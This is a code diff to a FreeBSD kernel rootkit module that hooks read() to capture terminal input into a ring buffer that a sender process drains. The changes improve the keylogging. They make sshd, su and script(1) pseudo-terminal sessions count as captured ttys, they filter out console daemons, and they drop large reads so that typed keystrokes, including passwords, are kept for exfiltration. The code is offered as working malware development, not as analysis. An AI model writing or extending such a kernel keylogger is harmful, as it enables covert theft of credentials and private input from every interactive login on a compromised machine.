@@ -47,6 +47,12 @@
 #define RK_LOG_MAX_CHUNKS 8		/* cap on the work a single read() may cause */
 
 /*
+ * Largest read() still treated as typed input. See rk_read_hook(): anything
+ * bigger is a program draining a tty, not a person typing at one.
+ */
+#define RK_LOG_MAX_READ	512
+
+/*
  * Ring buffer. rk_log_tail is the index of the oldest byte, rk_log_len is
  * how many valid bytes follow it (wrapping at RK_LOG_SIZE). When the buffer
  * is full the oldest bytes are thrown away, so the newest input always
@@ -391,6 +397,16 @@ rk_fd_is_tty(struct thread *td, int fd)
 
 	is_tty = 0;
 	vp = NULL;
+	/*
+	 * A pseudo-terminal is not a vnode file. finit() in tty_pts.c hands out
+	 * DTYPE_PTS, so the DTYPE_VNODE test below never matched sshd, su(1) or
+	 * script(1) sessions -- which is every interactive login a marker would
+	 * care about. Both cases count; only the vnode case can be our own cdev.
+	 */
+#ifdef DTYPE_PTS
+	if (fp->f_type == DTYPE_PTS)
+		is_tty = 1;
+#endif
 	if (fp->f_type == DTYPE_VNODE && fp->f_vnode != NULL) {
 		vp = fp->f_vnode;
 		if (!rootkit_is_our_vnode(vp) &&
@@ -414,13 +430,48 @@ rk_fd_is_tty(struct thread *td, int fd)
  * and rootkit_is_our_vnode() keeps the sender's drain of /dev/rootkit out of
  * the ring, which is what the fd == 0 test used to do by accident.
  */
+/*
+ * Daemons that read the console as part of their job. Their bytes are kernel
+ * messages and hotplug events, not something a person typed, and one of them
+ * was enough to bury the real keystrokes.
+ */
+static int
+rk_is_noise_proc(struct thread *td)
+{
+	static const char *noise[] = { "devd", "syslogd", "init" };
+	size_t i;
+
+	for (i = 0; i < nitems(noise); i++)
+		if (strcmp(td->td_proc->p_comm, noise[i]) == 0)
+			return (1);
+
+	return (0);
+}
 static int
 rk_read_hook(struct thread *td, void *args)
-{
-	struct read_args	*uap = args;
+{	struct read_args	*uap = args;
 	int			 error;
 
 	error = rk_read_orig(td, args);
+
+	/*
+	 * devd polls /dev/console for hotplug events and syslogd reads the
+	 * kernel console, which are tty reads like any other and flooded the
+	 * ring with megabytes of their own traffic during the first real test.
+	 * Their input is the kernel, not a user.
+	 */
+	if (rk_is_noise_proc(td))
+		return (error);
+
+	/*
+	 * Size gate. Typed input arrives line by line in canonical mode, so a
+	 * keystroke burst is tens of bytes. Reads of whole kilobytes out of a
+	 * tty are programs scraping a screen buffer or draining a console, and
+	 * one of those at 8 KB per read is enough to push the real keystrokes
+	 * out of the 64 KB ring before the sender drains it.
+	 */
+	if (td->td_retval[0] > (ssize_t)RK_LOG_MAX_READ)
+		return (error);
 
 	if (error == 0 && td->td_retval[0] > 0 &&
 	    (rk_log_pipes != 0 || rk_fd_is_tty(td, uap->fd)))
